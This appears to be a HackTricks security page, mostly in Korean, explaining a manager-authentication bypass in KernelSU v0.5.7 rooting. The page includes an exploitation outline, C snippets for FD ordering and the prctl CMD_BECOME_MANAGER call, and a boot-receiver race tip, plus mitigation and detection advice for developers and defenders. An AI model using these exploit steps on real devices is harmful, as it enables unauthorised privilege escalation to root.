# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU, APatch, SKRoot, Magisk와 같은 Rooting frameworks는 Linux/Android kernel을 자주 patch하고, hooked syscall을 통해 권한이 없는 userspace "manager" app에 privileged functionality를 노출합니다. manager-authentication 단계에 결함이 있으면 모든 local app이 이 channel에 접근하여 이미 rooted된 device에서 privileges를 escalate할 수 있습니다.

이 페이지는 공개 research(특히 Zimperium의 KernelSU v0.5.7 분석)에서 밝혀진 techniques와 pitfalls를 추상화하여, red/blue teams 모두가 attack surfaces, exploitation primitives 및 robust mitigations를 이해할 수 있도록 합니다.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch가 syscall(일반적으로 prctl)을 hook하여 userspace에서 "commands"를 수신합니다.
- Protocol은 일반적으로 다음과 같습니다: magic_value, command_id, arg_ptr/len ...
- userspace manager app이 먼저 authenticates합니다(예: CMD_BECOME_MANAGER). Kernel이 caller를 trusted manager로 표시하면 privileged commands가 허용됩니다:
- caller에게 root 부여(예: CMD_GRANT_ROOT)
- su의 allowlists/deny-lists 관리
- SELinux policy 조정(예: CMD_SET_SEPOLICY)
- version/configuration 조회
- 모든 app이 syscalls를 invoke할 수 있으므로 manager authentication의 correctness가 critical합니다.

Example (KernelSU design):
- Hooked syscall: prctl
- KernelSU handler로 divert하기 위한 magic value: 0xDEADBEEF
- Commands include: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## KernelSU v0.5.7 authentication flow (as implemented)

userspace가 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)을 호출하면 KernelSU는 다음을 verify합니다:

1) Path prefix check
- 제공된 path는 caller UID에 대해 예상되는 prefix로 시작해야 합니다(예: /data/data/<pkg> 또는 /data/user/<id>/<pkg>).
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- path는 caller UID가 소유해야 합니다.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) FD table scan을 통한 APK signature check
- calling process의 open file descriptors(FDs)를 순회합니다.
- path가 /data/app/*/base.apk와 일치하는 첫 번째 file을 선택합니다.
- APK v2 signature를 parse하고 official manager certificate와 대조하여 verify합니다.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

모든 checks가 통과하면 kernel은 manager의 UID를 일시적으로 cache하고, reset될 때까지 해당 UID의 privileged commands를 수락합니다.

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

signature check가 process FD table에서 발견된 "첫 번째 matching /data/app/*/base.apk"에 bind되어 있다면, 실제로 caller 자신의 package를 verify하는 것이 아닙니다. Attacker는 legitimately signed APK(실제 manager의 APK)를 미리 배치하여 자신의 base.apk보다 FD list에서 더 앞에 나타나도록 할 수 있습니다.

이러한 trust-by-indirection을 통해 unprivileged app은 manager의 signing key를 소유하지 않고도 manager로 impersonate할 수 있습니다.<sup>[[1]](#references)</sup>

악용되는 주요 properties:<sup>[[1]](#references)</sup>
- FD scan은 caller의 package identity에 bind되지 않고, path strings만 pattern-match합니다.
- open()은 사용 가능한 가장 낮은 FD를 반환합니다. 낮은 번호의 FDs를 먼저 close하면 attacker가 ordering을 control할 수 있습니다.
- filter는 path가 /data/app/*/base.apk와 일치하는지만 check하며, caller가 설치한 package에 해당하는지는 check하지 않습니다.

---
## Attack preconditions

- Device가 이미 vulnerable rooting framework(예: KernelSU v0.5.7)로 rooted되어 있습니다.
- Attacker가 local에서 임의의 unprivileged code(Android app process)를 실행할 수 있습니다.
- 실제 manager가 아직 authenticated되지 않았습니다(예: reboot 직후). 일부 frameworks는 성공 후 manager UID를 cache하므로, race에서 승리해야 합니다.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:<sup>[[1]](#references)[[9]](#references)</sup>
1) Prefix 및 ownership checks를 충족하도록 자신의 app data directory에 대한 유효한 path를 만듭니다.
2) genuine KernelSU Manager base.apk가 자신의 base.apk보다 낮은 번호의 FD에서 open되도록 합니다.
3) checks를 통과하기 위해 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)을 invoke합니다.
4) CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY와 같은 privileged commands를 issue하여 elevation을 persist합니다.

Practical notes on step 2 (FD ordering):<sup>[[1]](#references)</sup>
- /proc/self/fd symlinks를 walk하여 자신의 /data/app/*/base.apk에 대한 process FD를 identify합니다.
- 낮은 FD(예: stdin, fd 0)를 close한 다음 legitimate manager APK를 먼저 open하여 fd 0(또는 자신의 base.apk fd보다 낮은 index)을 차지하도록 합니다.
- legitimate manager APK를 자신의 app에 bundle하여 해당 path가 kernel의 naive filter를 satisfy하도록 합니다. 예를 들어 /data/app/*/base.apk와 일치하는 subpath 아래에 배치합니다.

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
더 낮은 번호의 FD가 정식 manager APK를 가리키도록 강제:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
prctl hook을 통한 Manager 인증:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
성공 후 privileged commands (예시):
- CMD_GRANT_ROOT: 현재 process를 root로 승격
- CMD_ALLOW_SU: persistent su를 위한 allowlist에 package/UID 추가
- CMD_SET_SEPOLICY: framework에서 지원하는 범위 내에서 SELinux policy 조정

Race/persistence tip:
- AndroidManifest에 BOOT_COMPLETED receiver (RECEIVE_BOOT_COMPLETED)를 등록하여 reboot 후 일찍 시작하고, 실제 manager보다 먼저 authentication을 시도합니다.<sup>[[1]](#references)</sup>

---
## Detection and mitigation guidance

framework 개발자를 위한 지침:
- 임의의 FD가 아니라 caller의 package/UID에 authentication을 binding합니다:
- UID에서 caller의 package를 확인하고, FD를 scan하는 대신 PackageManager를 통해 설치된 package의 signature와 일치하는지 검증합니다.
- kernel-only인 경우 안정적인 caller identity (task creds)를 사용하고, process FD가 아닌 init/userspace helper가 관리하는 안정적인 source of truth에서 검증합니다.
- path-prefix checks를 identity로 사용하지 않습니다. caller가 이를 쉽게 충족할 수 있습니다.
- channel을 통해 nonce-based challenge–response를 사용하고, boot 시 또는 주요 event 발생 시 cached manager identity를 삭제합니다.
- 가능한 경우 generic syscall을 과도하게 사용하는 대신 binder-based authenticated IPC를 고려합니다.

defender/blue team을 위한 지침:
- rooting frameworks와 manager processes의 존재를 탐지하고, kernel telemetry가 있다면 의심스러운 magic constants (예: 0xDEADBEEF)를 사용한 prctl calls를 모니터링합니다.
- managed fleets에서는 boot 후 신뢰할 수 없는 packages의 boot receivers가 privileged manager commands를 빠르게 시도하는 경우 차단하거나 alert를 생성합니다.
- devices가 patched framework versions로 업데이트되었는지 확인하고, update 시 cached manager IDs를 무효화합니다.

attack의 제한 사항:
- 취약한 framework로 이미 rooted된 devices에만 영향을 줍니다.
- 일반적으로 legitimate manager가 authentication하기 전 reboot/race window가 필요합니다 (일부 frameworks는 reset될 때까지 manager UID를 cache합니다).

---
## frameworks 전반의 관련 참고 사항

- Password-based auth (예: 과거의 APatch/SKRoot builds)는 password를 추측하거나 bruteforce할 수 있거나 validation에 bug가 있는 경우 취약할 수 있습니다.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth (예: KernelSU)는 원칙적으로 더 강력하지만, FD scans와 같은 간접적인 artefacts가 아니라 실제 caller에 binding해야 합니다.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: CVE-2024-48336 (MagiskEoP)는 성숙한 ecosystem도 identity spoofing에 취약하여 manager context 내부에서 root 권한으로 code execution이 발생할 수 있음을 보여주었습니다.<sup>[[1]](#references)[[8]](#references)</sup>

---
## References

- [1] [Zimperium – 모든 악의 근원인 Rooting: Mobile Device를 Compromise할 수 있는 Security Holes](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
